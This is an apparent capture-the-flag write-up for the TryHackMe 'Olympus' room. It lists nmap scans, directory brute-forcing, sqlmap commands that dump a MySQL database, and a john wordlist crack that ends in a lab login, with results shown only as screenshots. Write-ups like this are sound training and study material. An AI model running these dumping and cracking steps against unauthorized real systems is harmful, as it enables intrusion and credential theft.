# Olympus

**Room Link:** [https://tryhackme.com/room/olympusroom](https://tryhackme.com/room/olympusroom)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>





## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>









<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u olympus.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```









**Kali**

```
dirb http://olympus.thm
```



<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



















<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
sqlmap -r req.txt --banner
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
sqlmap -r req.txt --tables
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
sqlmap -r req.txt --dbms=mysql --dump
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
```

Rerun because VM crashed



**Browser**&#x20;

```
Username: prometheus
Password:summertime
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>



























































